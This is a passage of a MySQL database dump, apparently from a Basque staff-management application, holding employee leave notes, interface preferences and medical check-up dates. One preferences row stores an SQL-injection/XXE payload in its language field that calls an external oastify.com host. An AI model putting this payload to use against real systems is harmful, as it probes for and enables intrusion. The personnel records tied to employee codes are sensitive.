) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `observaciones`
--

LOCK TABLES `observaciones` WRITE;
/*!40000 ALTER TABLE `observaciones` DISABLE KEYS */;
INSERT INTO `observaciones` VALUES (8,291,'Vacaciones pendientes de disfrutar 2018 por baja: 16 dГӯas vacaciones, 5 Festivos y 1 FSR.\r\n*DГӯa 20/5/2019 devoluciГіn 1 FSR del 2018.\r\n*Del 8 al 14 de Julio devoluciГіn 7 dГӯas de vacaciones.\r\n*Del 26/08 al 1/09 de Julio devoluciГіn 7 dГӯas de vacaciones.\r\n','2019-05-08 11:03:32','2019-06-26 12:17:39'),(13,73,'Pendientes:\r\n 7 VAC 2019\r\n4 FSR 2019\r\n15 FES 2020 (27/04 al 10/05)','2019-11-14 14:03:34','2020-04-27 07:43:14'),(16,191,'Pendientes por IT: \r\n2019  1 FSR','2019-12-26 16:28:17','2020-03-24 19:03:46'),(19,178,'pendientes 2 vac de 2019','2020-01-27 10:35:34','2020-01-27 10:35:34'),(21,363,'PENDIENTE 1 VAC','2020-01-27 10:38:52','2020-01-27 10:38:52'),(22,370,'PENDIENTE 1 FSR 2019','2020-01-27 10:39:23','2020-01-27 10:39:23'),(23,394,'PENDIENTES 2 FES 2019','2020-01-27 10:40:54','2020-01-27 10:40:54'),(24,225,'pendiente 1 turno de vacaciones de 2020','2020-02-06 07:37:37','2020-02-06 07:37:37'),(27,356,'8 dГӯas de vacaciones pendientes por baja enfermedad','2020-04-17 05:25:35','2020-04-17 05:25:35'),(29,423,'Se le deben 14 Vac que le coinciden con la paternidad 28/02 al 13/03','2022-01-21 11:50:21','2022-01-21 11:50:21'),(30,89,'Se le deben 3 semanas de vacaciones (28/02 al 20/03)','2022-02-09 07:02:58','2022-02-09 07:02:58'),(31,181,'14 y 15/02 se le deben de vac por negociaciГіn de convenio','2022-02-17 12:10:51','2022-02-17 12:10:51');
/*!40000 ALTER TABLE `observaciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permisos`
--

DROP TABLE IF EXISTS `permisos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `permisos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `permiso` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permisos`
--

LOCK TABLES `permisos` WRITE;
/*!40000 ALTER TABLE `permisos` DISABLE KEYS */;
/*!40000 ALTER TABLE `permisos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permisos_roles`
--

DROP TABLE IF EXISTS `permisos_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `permisos_roles` (
  `id` int(11) NOT NULL,
  `rol_id` int(11) NOT NULL,
  `permiso_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `rol_id` (`rol_id`),
  KEY `permiso_id` (`permiso_id`),
  CONSTRAINT `permisos_roles_ibfk_1` FOREIGN KEY (`rol_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `permisos_roles_ibfk_2` FOREIGN KEY (`permiso_id`) REFERENCES `permisos` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permisos_roles`
--

LOCK TABLES `permisos_roles` WRITE;
/*!40000 ALTER TABLE `permisos_roles` DISABLE KEYS */;
/*!40000 ALTER TABLE `permisos_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `preferences`
--

DROP TABLE IF EXISTS `preferences`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `preferences` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `preference` varchar(20) NOT NULL,
  `value` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id_2` (`user_id`,`preference`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `preferences_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=498 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `preferences`
--

LOCK TABLES `preferences` WRITE;
/*!40000 ALTER TABLE `preferences` DISABLE KEYS */;
INSERT INTO `preferences` VALUES (1,9,'PUESTOS_GESTION','1,2'),(3,9,'IDIOMA','es_ES'),(6,11,'PUESTOS_GESTION','1,2'),(7,11,'IDIOMA','es_ES'),(10,9,'skin','skin-blue'),(15,11,'skin','skin-blue'),(18,15,'PUESTOS_GESTION','1'),(19,15,'IDIOMA','eu_ES'),(20,15,'skin','skin-blue'),(21,16,'PUESTOS_GESTION','1'),(22,16,'IDIOMA','es_ES'),(23,16,'skin','skin-blue'),(24,17,'PUESTOS_GESTION','1'),(25,17,'IDIOMA','es_ES'),(26,17,'skin','skin-blue'),(27,18,'PUESTOS_GESTION','1'),(28,18,'IDIOMA','eu_ES'),(29,18,'skin','skin-blue'),(33,20,'PUESTOS_GESTION','1,2'),(34,20,'IDIOMA','es_ES'),(35,20,'skin','skin-blue'),(36,21,'PUESTOS_GESTION','1,2'),(37,21,'IDIOMA','es_ES'),(38,21,'skin','skin-blue'),(39,22,'PUESTOS_GESTION','1,2'),(40,22,'IDIOMA','es_ES'),(41,22,'skin','skin-blue'),(42,23,'PUESTOS_GESTION','1,2'),(43,23,'IDIOMA','es_ES'),(44,23,'skin','skin-blue'),(45,24,'PUESTOS_GESTION','1,2'),(46,24,'IDIOMA','es_ES'),(47,24,'skin','skin-blue'),(48,25,'PUESTOS_GESTION','2'),(49,25,'IDIOMA','es_ES'),(50,25,'skin',''),(51,26,'PUESTOS_GESTION','1'),(52,26,'IDIOMA','es_ES'),(53,26,'skin','skin-blue'),(54,27,'PUESTOS_GESTION','1'),(55,27,'IDIOMA','es_ES'),(56,27,'skin','skin-blue'),(57,28,'PUESTOS_GESTION','1'),(58,28,'IDIOMA','es_ES'),(59,28,'skin','skin-blue'),(60,29,'PUESTOS_GESTION','1'),(61,29,'IDIOMA','es_ES'),(62,29,'skin','skin-blue'),(63,30,'PUESTOS_GESTION','1,2'),(64,30,'IDIOMA','es_ES'),(65,30,'skin','skin-green-light'),(66,31,'PUESTOS_GESTION','1'),(67,31,'IDIOMA','es_ES'),(68,31,'skin','skin-green-light'),(69,32,'PUESTOS_GESTION','1'),(70,32,'IDIOMA','es_ES'),(71,32,'skin','skin-blue'),(72,33,'PUESTOS_GESTION','1'),(73,33,'IDIOMA','es_ES'),(74,33,'skin','skin-blue'),(75,34,'PUESTOS_GESTION','1'),(76,34,'IDIOMA','es_ES'),(77,34,'skin','skin-blue'),(78,35,'PUESTOS_GESTION','1'),(79,35,'IDIOMA','es_ES'),(80,35,'skin','skin-purple-light'),(81,36,'PUESTOS_GESTION','1'),(82,36,'IDIOMA','es_ES'),(83,36,'skin','skin-blue'),(84,37,'PUESTOS_GESTION','1'),(85,37,'IDIOMA','es_ES'),(86,37,'skin','skin-blue'),(87,38,'PUESTOS_GESTION','2'),(88,38,'IDIOMA','es_ES'),(89,38,'skin','skin-blue'),(90,39,'PUESTOS_GESTION','1'),(91,39,'IDIOMA','es_ES'),(92,39,'skin','skin-blue'),(93,40,'PUESTOS_GESTION','1'),(94,40,'IDIOMA','es_ES'),(95,40,'skin','skin-blue'),(96,41,'PUESTOS_GESTION','1'),(97,41,'IDIOMA','es_ES'),(98,41,'skin','skin-blue'),(99,42,'PUESTOS_GESTION','1'),(100,42,'IDIOMA','es_ES'),(101,42,'skin','skin-blue'),(102,43,'PUESTOS_GESTION','2'),(103,43,'IDIOMA','es_ES'),(104,43,'skin','skin-red-light'),(105,44,'PUESTOS_GESTION','1,2'),(106,44,'IDIOMA','es_ES'),(107,44,'skin','skin-blue'),(108,45,'PUESTOS_GESTION','2'),(109,45,'IDIOMA','es_ES'),(110,45,'skin','skin-blue'),(114,47,'PUESTOS_GESTION','1,2'),(115,47,'IDIOMA','es_ES'),(116,47,'skin','skin-blue'),(117,48,'PUESTOS_GESTION','2'),(118,48,'IDIOMA','es_ES'),(119,48,'skin','skin-blue'),(120,49,'PUESTOS_GESTION','2'),(121,49,'IDIOMA','eu_ES'),(122,49,'skin','skin-blue'),(123,50,'PUESTOS_GESTION','1,2'),(124,50,'IDIOMA','es_ES'),(125,50,'skin','skin-blue'),(129,52,'PUESTOS_GESTION','1,2'),(130,52,'IDIOMA','es_ES'),(131,52,'skin','skin-blue'),(132,53,'PUESTOS_GESTION','1,2'),(133,53,'IDIOMA','es_ES'),(134,53,'skin','skin-blue'),(135,54,'PUESTOS_GESTION','2'),(136,54,'IDIOMA','es_ES'),(137,54,'skin','skin-blue'),(138,55,'PUESTOS_GESTION','2'),(139,55,'IDIOMA','es_ES'),(140,55,'skin','skin-blue'),(141,56,'PUESTOS_GESTION','2'),(142,56,'IDIOMA','es_ES'),(143,56,'skin','skin-blue'),(144,57,'PUESTOS_GESTION','2'),(145,57,'IDIOMA','es_ES'),(146,57,'skin',''),(147,58,'PUESTOS_GESTION','2'),(148,58,'IDIOMA','es_ES'),(149,58,'skin','skin-blue'),(150,59,'PUESTOS_GESTION','2'),(151,59,'IDIOMA','es_ES'),(152,59,'skin','skin-blue'),(153,60,'PUESTOS_GESTION','1'),(154,60,'IDIOMA','es_ES'),(155,60,'skin','skin-blue'),(156,61,'PUESTOS_GESTION','2'),(157,61,'IDIOMA','es_ES'),(158,61,'skin','skin-blue'),(159,62,'PUESTOS_GESTION','2'),(160,62,'IDIOMA','es_ES'),(161,62,'skin','skin-blue'),(162,63,'PUESTOS_GESTION','2'),(163,63,'IDIOMA','es_ES'),(164,63,'skin','skin-purple'),(165,64,'PUESTOS_GESTION','2'),(166,64,'IDIOMA','es_ES'),(167,64,'skin','skin-blue'),(168,65,'PUESTOS_GESTION','1,2'),(169,65,'IDIOMA','es_ES'),(170,65,'skin','skin-blue'),(171,66,'PUESTOS_GESTION','1,2'),(172,66,'IDIOMA','es_ES'),(173,66,'skin','skin-blue'),(174,67,'PUESTOS_GESTION','1,2'),(175,67,'IDIOMA','es_ES'),(176,67,'skin','skin-green-light'),(177,68,'PUESTOS_GESTION','1'),(178,68,'IDIOMA','es_ES'),(179,68,'skin','skin-green-light'),(180,69,'PUESTOS_GESTION','2'),(181,69,'IDIOMA','es_ES'),(182,69,'skin',''),(183,70,'PUESTOS_GESTION','2'),(184,70,'IDIOMA','es_ES'),(185,70,'skin','skin-blue'),(186,71,'PUESTOS_GESTION','1,2'),(187,71,'IDIOMA','es_ES'),(188,71,'skin','skin-blue'),(189,72,'PUESTOS_GESTION','1,2'),(190,72,'IDIOMA','es_ES'),(191,72,'skin','skin-blue'),(192,73,'PUESTOS_GESTION','1'),(193,73,'IDIOMA','es_ES'),(194,73,'skin','skin-blue'),(195,74,'PUESTOS_GESTION','1'),(196,74,'IDIOMA','es_ES'),(197,74,'skin',''),(198,75,'PUESTOS_GESTION','2'),(199,75,'IDIOMA','es_ES'),(200,75,'skin','skin-blue'),(201,76,'PUESTOS_GESTION','2'),(202,76,'IDIOMA','es_ES'),(203,76,'skin','skin-blue'),(204,77,'PUESTOS_GESTION','2'),(205,77,'IDIOMA','es_ES'),(206,77,'skin','skin-blue'),(207,78,'PUESTOS_GESTION','1'),(208,78,'IDIOMA','es_ES'),(209,78,'skin',''),(210,79,'PUESTOS_GESTION','2'),(211,79,'IDIOMA','es_ES'),(212,79,'skin','skin-black'),(213,80,'PUESTOS_GESTION','1,2'),(214,80,'IDIOMA','es_ES'),(215,80,'skin','skin-blue'),(216,81,'PUESTOS_GESTION','1'),(217,81,'IDIOMA','es_ES'),(218,81,'skin','skin-blue'),(222,83,'PUESTOS_GESTION','1'),(223,83,'IDIOMA','es_ES'),(224,83,'skin','skin-blue'),(225,84,'PUESTOS_GESTION','1'),(226,84,'IDIOMA','es_ES'),(227,84,'skin','skin-blue'),(228,85,'PUESTOS_GESTION','2'),(229,85,'IDIOMA','es_ES'),(230,85,'skin','skin-blue'),(231,86,'PUESTOS_GESTION','2'),(232,86,'IDIOMA','es_ES'),(233,86,'skin',''),(234,87,'PUESTOS_GESTION','2'),(235,87,'IDIOMA','es_ES'),(236,87,'skin','skin-blue'),(237,88,'PUESTOS_GESTION','1,2'),(238,88,'IDIOMA','es_ES'),(239,88,'skin','skin-blue'),(240,89,'PUESTOS_GESTION','1,2'),(241,89,'IDIOMA','es_ES'),(242,89,'skin','skin-blue'),(243,90,'PUESTOS_GESTION','1,2'),(244,90,'IDIOMA','es_ES'),(245,90,'skin','skin-blue'),(246,91,'PUESTOS_GESTION','1'),(247,91,'IDIOMA','es_ES'),(248,91,'skin','skin-blue'),(249,92,'PUESTOS_GESTION','1'),(250,92,'IDIOMA','es_ES'),(251,92,'skin','skin-blue'),(252,93,'PUESTOS_GESTION','2'),(253,93,'IDIOMA','es_ES'),(254,93,'skin','skin-blue'),(255,94,'PUESTOS_GESTION','1'),(256,94,'IDIOMA','es_ES'),(257,94,'skin','skin-blue'),(258,95,'PUESTOS_GESTION','2'),(259,95,'IDIOMA','es_ES'),(260,95,'skin','skin-purple'),(261,96,'PUESTOS_GESTION','2'),(262,96,'IDIOMA','es_ES'),(263,96,'skin','skin-blue'),(264,97,'PUESTOS_GESTION','2'),(265,97,'IDIOMA','es_ES'),(266,97,'skin','skin-blue'),(267,98,'PUESTOS_GESTION','1'),(268,98,'IDIOMA','es_ES'),(269,98,'skin','skin-blue'),(273,100,'PUESTOS_GESTION','1'),(274,100,'IDIOMA','es_ES'),(275,100,'skin','skin-blue'),(276,101,'PUESTOS_GESTION','2'),(277,101,'IDIOMA','es_ES'),(278,101,'skin','skin-blue'),(279,102,'PUESTOS_GESTION','2'),(280,102,'IDIOMA','es_ES'),(281,102,'skin','skin-blue'),(282,103,'PUESTOS_GESTION','1'),(283,103,'IDIOMA','es_ES'),(284,103,'skin','skin-blue'),(285,104,'PUESTOS_GESTION','2'),(286,104,'IDIOMA','es_ES'),(287,104,'skin','skin-blue'),(288,105,'PUESTOS_GESTION','1'),(289,105,'IDIOMA','es_ES'),(290,105,'skin','skin-blue'),(291,106,'PUESTOS_GESTION','1'),(292,106,'IDIOMA','eu_ES'),(293,106,'skin','skin-blue'),(294,107,'PUESTOS_GESTION','2'),(295,107,'IDIOMA','es_ES'),(296,107,'skin','skin-blue'),(297,108,'PUESTOS_GESTION','1'),(298,108,'IDIOMA','eu_ES'),(299,108,'skin','skin-blue'),(300,109,'PUESTOS_GESTION','1'),(301,109,'IDIOMA','es_ES'),(302,109,'skin','skin-blue'),(303,110,'PUESTOS_GESTION','2'),(304,110,'IDIOMA','es_ES'),(305,110,'skin','skin-blue'),(306,111,'PUESTOS_GESTION','2'),(307,111,'IDIOMA','es_ES'),(308,111,'skin','skin-blue'),(309,112,'PUESTOS_GESTION','1'),(310,112,'IDIOMA','es_ES'),(311,112,'skin','skin-blue'),(312,113,'PUESTOS_GESTION','1'),(313,113,'IDIOMA','es_ES'),(314,113,'skin','skin-blue'),(315,114,'PUESTOS_GESTION','1,2'),(316,114,'IDIOMA','es_ES'),(317,114,'skin','skin-blue'),(318,115,'PUESTOS_GESTION','2'),(319,115,'IDIOMA','es_ES'),(320,115,'skin','skin-blue'),(321,116,'PUESTOS_GESTION','1,2'),(322,116,'IDIOMA','es_ES'),(323,116,'skin','skin-blue'),(324,117,'PUESTOS_GESTION','1'),(325,117,'IDIOMA','es_ES'),(326,117,'skin','skin-blue'),(327,118,'PUESTOS_GESTION','1'),(328,118,'IDIOMA','es_ES'),(329,118,'skin','skin-blue'),(330,119,'PUESTOS_GESTION','2'),(331,119,'IDIOMA','es_ES'),(332,119,'skin','skin-blue'),(333,120,'PUESTOS_GESTION','2'),(334,120,'IDIOMA','es_ES'),(335,120,'skin','skin-blue'),(336,121,'PUESTOS_GESTION','1'),(337,121,'IDIOMA','es_ES'),(338,121,'skin','skin-blue'),(339,122,'PUESTOS_GESTION','1'),(340,122,'IDIOMA','es_ES'),(341,122,'skin','skin-blue-light'),(342,123,'PUESTOS_GESTION','1'),(343,123,'IDIOMA','es_ES'),(344,123,'skin','skin-blue'),(345,124,'PUESTOS_GESTION','1'),(346,124,'IDIOMA','es_ES'),(347,124,'skin','skin-red'),(348,125,'PUESTOS_GESTION','1'),(349,125,'IDIOMA','es_ES'),(350,125,'skin','skin-blue'),(351,126,'PUESTOS_GESTION','1'),(352,126,'IDIOMA','es_ES'),(353,126,'skin','skin-blue'),(354,127,'PUESTOS_GESTION','1'),(355,127,'IDIOMA','es_ES'),(356,127,'skin','skin-blue'),(357,128,'PUESTOS_GESTION','1'),(358,128,'IDIOMA','es_ES'),(359,128,'skin','skin-blue'),(360,129,'PUESTOS_GESTION','1'),(361,129,'IDIOMA','es_ES'),(362,129,'skin','skin-blue'),(363,130,'PUESTOS_GESTION','1'),(364,130,'IDIOMA','es_ES'),(365,130,'skin','skin-blue'),(369,132,'PUESTOS_GESTION','1'),(370,132,'IDIOMA','es_ES'),(371,132,'skin','skin-blue'),(372,133,'PUESTOS_GESTION','1,2'),(373,133,'IDIOMA','es_ES'),(374,133,'skin','skin-blue'),(375,134,'PUESTOS_GESTION','1'),(376,134,'IDIOMA','es_ES'),(377,134,'skin','skin-yellow'),(378,135,'PUESTOS_GESTION','2'),(379,135,'IDIOMA','es_ES'),(380,135,'skin','skin-blue'),(381,136,'PUESTOS_GESTION','1'),(382,136,'IDIOMA','es_ES'),(383,136,'skin','skin-blue'),(384,137,'PUESTOS_GESTION','1,2'),(385,137,'IDIOMA','es_ES'),(386,137,'skin','skin-blue'),(387,138,'PUESTOS_GESTION','1,2'),(388,138,'IDIOMA','es_ES'),(389,138,'skin','skin-blue'),(390,139,'PUESTOS_GESTION','2'),(391,139,'IDIOMA','es_ES'),(392,139,'skin','skin-blue'),(393,140,'PUESTOS_GESTION','1'),(394,140,'IDIOMA','es_ES'),(395,140,'skin','skin-blue'),(396,141,'PUESTOS_GESTION','1,2'),(397,141,'IDIOMA','es_ES'),(398,141,'skin','skin-blue'),(399,142,'PUESTOS_GESTION','1'),(400,142,'IDIOMA','es_ES'),(401,142,'skin','skin-blue'),(402,143,'PUESTOS_GESTION','1'),(403,143,'IDIOMA','es_ES'),(404,143,'skin','skin-green'),(405,144,'PUESTOS_GESTION','1,2'),(406,144,'IDIOMA','es_ES'),(407,144,'skin','skin-blue'),(408,145,'PUESTOS_GESTION','2'),(409,145,'IDIOMA','es_ES'),(410,145,'skin','skin-blue'),(411,146,'PUESTOS_GESTION','1'),(412,146,'IDIOMA','es_ES'),(413,146,'skin','skin-blue'),(414,147,'PUESTOS_GESTION','1'),(415,147,'IDIOMA','es_ES'),(416,147,'skin','skin-blue'),(417,148,'PUESTOS_GESTION','1'),(418,148,'IDIOMA','es_ES'),(419,148,'skin','skin-blue'),(420,149,'PUESTOS_GESTION','1'),(421,149,'IDIOMA','es_ES'),(422,149,'skin','skin-blue'),(423,150,'PUESTOS_GESTION','1'),(424,150,'IDIOMA','es_ES'),(425,150,'skin','skin-blue'),(426,151,'PUESTOS_GESTION','2'),(427,151,'IDIOMA','es_ES'),(428,151,'skin','skin-blue'),(429,152,'PUESTOS_GESTION','1'),(430,152,'IDIOMA','es_ES'),(431,152,'skin','skin-blue'),(432,153,'PUESTOS_GESTION','1'),(433,153,'IDIOMA','es_ES'),(434,153,'skin','skin-yellow'),(435,154,'PUESTOS_GESTION','1'),(436,154,'IDIOMA','es_ES'),(437,154,'skin','skin-blue'),(438,155,'PUESTOS_GESTION','1'),(439,155,'IDIOMA','es_ES'),(440,155,'skin','skin-blue'),(441,156,'PUESTOS_GESTION','2'),(442,156,'IDIOMA','es_ES'),(443,156,'skin','skin-blue'),(444,157,'PUESTOS_GESTION','1'),(445,157,'IDIOMA','es_ES'),(446,157,'skin','skin-blue'),(447,158,'PUESTOS_GESTION','1,2'),(448,158,'IDIOMA','es_ES'),(449,158,'skin','skin-yellow'),(450,159,'PUESTOS_GESTION','1,2'),(451,159,'IDIOMA','(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % brypd SYSTEM \"http://o5ub97p8cupu9zr8nw74na10mrsij6c104owbnzc.oasti\'||\'fy.com/\">%brypd;]>\'),\'/l\') from dual)'),(452,159,'skin',''),(453,160,'PUESTOS_GESTION','1'),(454,160,'IDIOMA','es_ES'),(455,160,'skin','skin-blue'),(456,161,'PUESTOS_GESTION','1'),(457,161,'IDIOMA','es_ES'),(458,161,'skin','skin-blue'),(459,162,'PUESTOS_GESTION','1'),(460,162,'IDIOMA','es_ES'),(461,162,'skin','skin-blue'),(462,163,'PUESTOS_GESTION','1'),(463,163,'IDIOMA','es_ES'),(464,163,'skin','skin-blue'),(465,164,'PUESTOS_GESTION','1'),(466,164,'IDIOMA','es_ES'),(467,164,'skin','skin-blue'),(468,165,'PUESTOS_GESTION','1'),(469,165,'IDIOMA','es_ES'),(470,165,'skin','skin-blue'),(471,166,'PUESTOS_GESTION','1'),(472,166,'IDIOMA','es_ES'),(473,166,'skin','skin-blue'),(474,167,'PUESTOS_GESTION','1'),(475,167,'IDIOMA','es_ES'),(476,167,'skin','skin-blue'),(477,168,'PUESTOS_GESTION','1'),(478,168,'IDIOMA','es_ES'),(479,168,'skin','skin-blue'),(480,169,'PUESTOS_GESTION','1'),(481,169,'IDIOMA','es_ES'),(482,169,'skin','skin-blue'),(483,170,'PUESTOS_GESTION','1'),(484,170,'IDIOMA','es_ES'),(485,170,'skin','skin-blue'),(486,171,'PUESTOS_GESTION','1'),(487,171,'IDIOMA','es_ES'),(488,171,'skin','skin-blue'),(489,172,'PUESTOS_GESTION','2'),(490,172,'IDIOMA','es_ES'),(491,172,'skin','skin-blue'),(492,173,'PUESTOS_GESTION','1'),(493,173,'IDIOMA','es_ES'),(494,173,'skin','skin-blue'),(495,174,'PUESTOS_GESTION','1'),(496,174,'IDIOMA','es_ES'),(497,174,'skin','skin-blue');
/*!40000 ALTER TABLE `preferences` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `puestos_gestion`
--

DROP TABLE IF EXISTS `puestos_gestion`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `puestos_gestion` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `puesto` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `puesto` (`puesto`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `puestos_gestion`
--

LOCK TABLES `puestos_gestion` WRITE;
/*!40000 ALTER TABLE `puestos_gestion` DISABLE KEYS */;
INSERT INTO `puestos_gestion` VALUES (2,'P.M. ATXURI'),(1,'P.M. DONOSTIA');
/*!40000 ALTER TABLE `puestos_gestion` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `reconocimientos_medico`
--

DROP TABLE IF EXISTS `reconocimientos_medico`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `reconocimientos_medico` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `year` year(4) NOT NULL,
  `fecha` date NOT NULL,
  `codigo_agente` int(11) NOT NULL,
  `lugar` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `lugar_id` int(11) NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`),
  KEY `FK_ReconocimientosMedicos_Agentes` (`codigo_agente`),
  KEY `lugar_id` (`lugar_id`),
  CONSTRAINT `reconocimientos_medico_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `reconocimientos_medico_ibfk_2` FOREIGN KEY (`lugar_id`) REFERENCES `lugares_reconocimientos` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=469 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `reconocimientos_medico`
--

LOCK TABLES `reconocimientos_medico` WRITE;
/*!40000 ALTER TABLE `reconocimientos_medico` DISABLE KEYS */;
INSERT INTO `reconocimientos_medico` VALUES (2,2017,'2017-11-20',66,'',7),(3,2017,'2017-11-20',78,'',7),(4,2016,'2016-06-08',81,'',7),(5,2017,'2017-05-15',88,'',7),(6,2017,'2017-03-31',102,'',7),(7,2017,'2017-11-24',126,'',7),(8,2017,'2017-05-15',129,'',7),(9,2017,'2017-03-30',140,'',7),(10,2016,'2016-05-30',150,'',7),(11,2016,'2016-06-06',155,'',7),(12,2016,'2016-05-24',159,'',7),(13,2016,'2016-06-28',171,'',7),(14,2016,'2016-05-18',180,'',7),(15,2016,'2016-03-09',190,'',7),(16,2017,'2017-06-09',192,'',7),(17,2016,'2016-03-02',193,'',7),(18,2016,'2016-06-08',196,'',7),(19,2016,'2016-10-05',197,'',7),(20,2017,'2017-11-24',198,'',7),(21,2017,'2017-11-27',200,'',7),(22,2017,'2017-12-14',201,'',7),(23,2016,'2016-05-23',207,'',7),(24,2017,'2017-11-22',239,'',7),(25,2016,'2016-05-30',241,'',7),(26,2016,'2016-05-25',244,'',7),(27,2016,'2016-03-03',245,'',7),(28,2017,'2017-11-22',247,'',7),(29,2016,'2016-03-03',291,'',7),(30,2016,'2016-05-26',292,'',7),(31,2016,'2016-01-21',355,'',7),(32,2017,'2017-11-21',356,'',7),(33,2017,'2017-11-03',367,'BILBAO',1),(34,2017,'2017-12-22',150,'EIBAR',6),(37,2018,'2018-01-22',193,'DONOSTIA',7),(39,2018,'2018-02-06',171,'DONOSTIA',7),(40,2018,'2018-01-26',196,'DONOSTIA',7),(42,2016,'2016-06-30',189,'BILBAO',1),(43,2016,'2016-04-21',218,'BILBAO',1),(44,2017,'2017-02-23',284,'BILBAO',1),(46,2016,'2016-04-28',178,'BASAURI',3),(47,2017,'2017-05-11',73,'GERNIKA',4),(48,2015,'2015-04-20',217,'IURRETA',8),(49,2017,'2017-11-23',167,'BASAURI',3),(50,2017,'2017-10-03',277,'BILBAO',1),(51,2016,'2016-07-07',306,'BILBAO',1),(52,2017,'2017-10-26',136,'BILBAO',1),(53,2017,'2017-05-09',293,'BILBAO',1),(54,2017,'2017-05-15',89,'DURANGO',2),(56,2017,'2017-05-16',253,'BASAURI',3),(57,2017,'2017-10-31',276,'BILBAO',1),(58,2017,'2017-04-25',133,'BILBAO',1),(59,2017,'2017-10-05',336,'BILBAO',1),(60,2017,'2017-05-23',233,'DURANGO',2),(61,2016,'2016-05-04',366,'BASAURI',3),(62,2017,'2017-05-17',228,'GERNIKA',4),(63,2016,'2016-05-03',63,'ERANDIO',5),(64,2017,'2017-05-18',179,'DURANGO',2),(65,2016,'2016-04-14',229,'GERNIKA',4),(66,2017,'2017-11-02',370,'BILBAO',1),(68,2017,'2017-05-24',287,'GERNIKA',4),(69,2016,'2016-05-31',143,'BILBAO',1),(70,2017,'2017-11-22',234,'BILBAO',1),(71,2017,'2017-05-31',181,'DURANGO',2),(72,2017,'2017-11-06',363,'BILBAO',1),(73,2017,'2017-11-02',358,'BILBAO',1),(74,2017,'2017-02-28',191,'BASAURI',3),(75,2017,'2017-10-26',225,NULL,4),(77,2017,'2017-05-02',378,NULL,1),(79,2017,'2017-05-02',380,NULL,1),(80,2017,'2017-05-02',382,NULL,1),(81,2017,'2017-05-02',379,NULL,1),(83,2018,'2018-02-07',355,NULL,7),(84,2018,'2018-02-08',140,NULL,7),(86,2018,'2018-02-05',241,NULL,1),(87,2018,'2018-02-07',306,NULL,1),(89,2018,'2018-02-08',191,NULL,3),(90,2018,'2018-02-07',73,NULL,4),(91,2017,'2017-01-02',371,NULL,1),(93,2018,'2018-02-06',371,NULL,1),(95,2017,'2017-09-04',381,NULL,7),(96,2017,'2017-11-06',385,NULL,7),(97,2017,'2017-02-13',375,NULL,7),(98,2018,'2018-02-01',63,NULL,1),(100,2018,'2018-02-13',366,NULL,1),(104,2016,'2016-01-01',202,NULL,3),(105,2018,'2018-02-14',245,NULL,7),(106,2017,'2017-11-23',207,NULL,7),(107,2018,'2018-02-13',129,NULL,7),(108,2018,'2018-02-12',192,NULL,7),(109,2018,'2018-02-28',229,NULL,3),(110,2018,'2018-03-01',189,NULL,9),(111,2018,'2018-03-14',218,NULL,1),(112,2018,'2018-03-06',217,NULL,2),(113,2018,'2018-03-12',190,NULL,7),(114,2018,'2018-03-13',159,NULL,1),(115,2018,'2018-03-13',202,NULL,3),(116,2019,'2019-05-14',178,NULL,3),(117,2018,'2018-05-01',394,NULL,1),(118,2018,'2018-05-01',395,NULL,1),(119,2018,'2018-05-17',133,NULL,2),(120,2018,'2018-05-24',292,NULL,7),(121,2018,'2018-06-14',81,NULL,6),(122,2018,'2018-05-29',244,NULL,